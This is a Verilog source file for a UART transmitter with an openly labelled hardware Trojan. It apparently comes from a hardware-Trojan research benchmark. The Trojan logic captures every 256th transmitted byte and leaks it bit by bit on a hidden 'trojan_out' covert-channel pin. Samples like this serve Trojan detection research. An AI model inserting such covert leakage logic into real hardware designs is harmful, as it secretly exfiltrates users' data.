// RS232-T100: UART Trojan leaking data

module uart_tx_trojan(
    input clk,
    input rst,
    input [7:0] data_in,
    input tx_start,
    output reg tx,
    output reg tx_busy,
    output reg trojan_out  // Covert channel
);

    reg [3:0] bit_cnt;
    reg [7:0] shift_reg;
    reg [15:0] baud_cnt;

    // Trojan: leak every 256th byte
    reg [7:0] leak_counter;
    wire trojan_trigger = (leak_counter == 8'hFF);
    reg [7:0] Trojan_data_capture;

    parameter BAUD_DIV = 16'd868;  // 115200 baud @ 100MHz

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            tx <= 1'b1;
            tx_busy <= 1'b0;
            bit_cnt <= 4'b0;
            shift_reg <= 8'b0;
            baud_cnt <= 16'b0;
            leak_counter <= 8'b0;
            trojan_out <= 1'b0;
            Trojan_data_capture <= 8'b0;
        end else begin
            if (tx_start && !tx_busy) begin
                tx_busy <= 1'b1;
                shift_reg <= data_in;
                bit_cnt <= 4'd10;
                baud_cnt <= 16'b0;
                leak_counter <= leak_counter + 1;

                // Trojan: capture data for covert leak
                if (trojan_trigger) begin
                    Trojan_data_capture <= data_in;
                end
            end else if (tx_busy) begin
                if (baud_cnt == BAUD_DIV) begin
                    baud_cnt <= 16'b0;
                    if (bit_cnt > 0) begin
                        tx <= (bit_cnt == 10) ? 1'b0 : shift_reg[0];
                        shift_reg <= {1'b1, shift_reg[7:1]};
                        bit_cnt <= bit_cnt - 1;
                    end else begin
                        tx_busy <= 1'b0;
                        tx <= 1'b1;
                    end
                end else begin
                    baud_cnt <= baud_cnt + 1;
                end
            end

            // Trojan covert channel output
            trojan_out <= Trojan_data_capture[leak_counter[2:0]];
        end
    end

endmodule
